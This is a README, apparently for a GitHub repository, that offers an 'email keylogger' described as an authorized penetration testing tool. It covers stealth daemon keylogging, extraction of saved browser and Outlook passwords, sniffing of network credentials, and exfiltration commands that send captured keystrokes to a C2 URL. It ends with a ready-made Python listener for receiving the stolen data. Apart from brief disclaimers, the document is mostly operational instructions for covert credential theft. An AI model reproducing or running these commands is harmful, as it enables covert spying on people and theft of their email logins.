# Email Keylogger - Authorized Penetration Testing Tool

> **Legal Notice:** This tool is for **authorized security testing only**.
> Unauthorized use is illegal. The author is not responsible for misuse.

## Features

- 🔑 Context-aware keylogging (flags email login pages)
- 📧 Email credential harvester (browser extraction)
- 🌐 Network credential sniffer (IMAP/POP3/SMTP/HTTP)
- ⚡ Real-time email context detection
- 🔄 C2 exfiltration support
- 🕵️ Stealth mode (daemon, no window)
- 📝 Automatic logging with timestamps

## Installation

```bash
git clone https://github.com/sheikh-coedextech/email-keylogger.git
cd email-keylogger
chmod +x setup.sh
./setup.sh

*USAGE*

*KEYLOGGER*
# Basic run
python3 keylogger.py

# Background mode (daemon)
python3 keylogger.py --daemon

# With C2 exfiltration
python3 keylogger.py --exfil https://your-server.com/collect

# Custom log path
python3 keylogger.py --log /path/to/log

*CREDENTIAL HARVESTING*
# Extract saved browser passwords
python3 email_harvester.py

# Network sniffing (requires root)
sudo python3 network_sniffer.py -i eth0

How It Works
Keylogger monitors keystrokes and detects when user is on email login pages
Harvester extracts saved credentials from Chrome/Firefox/Outlook
Sniffer captures credentials from unencrypted email protocols
Detection
Logs are stored at /tmp/.ekl by default. Use --log to change. Email context is flagged with [EMAIL] prefix in logs.

Disclaimer
This software is provided for educational purposes and authorized security testing only. Users must have explicit permission before deploying.

## 2. GitHub Setup Commands

```bash
# One-time setup
git config --global user.name "Your Name"
git config --global user.email "your@email.com"

# Create repo and push
echo "# Email Keylogger - Authorized Penetration Testing" >> README.md
git init
git add .
git commit -m "Initial commit - Email keylogger for authorized testing"
git branch -M main
git remote add origin https://github.com/sheikh-coedextech/email-keylogger.git
git push -u origin main

 *3 COMMANDS INSIDE THE REPO*

# 1. First time setup
chmod +x setup.sh
./setup.sh

# 2. Start keylogger
python3 keylogger.py                           # Foreground
python3 keylogger.py --daemon                  # Background
python3 keylogger.py --exfil http://192.168.1.100:8080/collect  # With C2

# 3. Extract saved browser credentials
python3 email_harvester.py

# 4. Sniff network for email creds (root)
sudo python3 network_sniffer.py -i eth0

# 5. Monitor logs in real-time
tail -f /tmp/.ekl

# 6. View captured credentials
cat /tmp/.ekl.lines | grep "\[EMAIL\]"

4. Quick C2 Receive Server (if you want exfil)

# Simple listener to receive exfiltrated data
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        data = self.rfile.read(int(self.headers['Content-Length']))
        print(f'Received: {data.decode()}')
        with open('/tmp/c2_log.txt', 'a') as f:
            f.write(data.decode() + '\n')
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
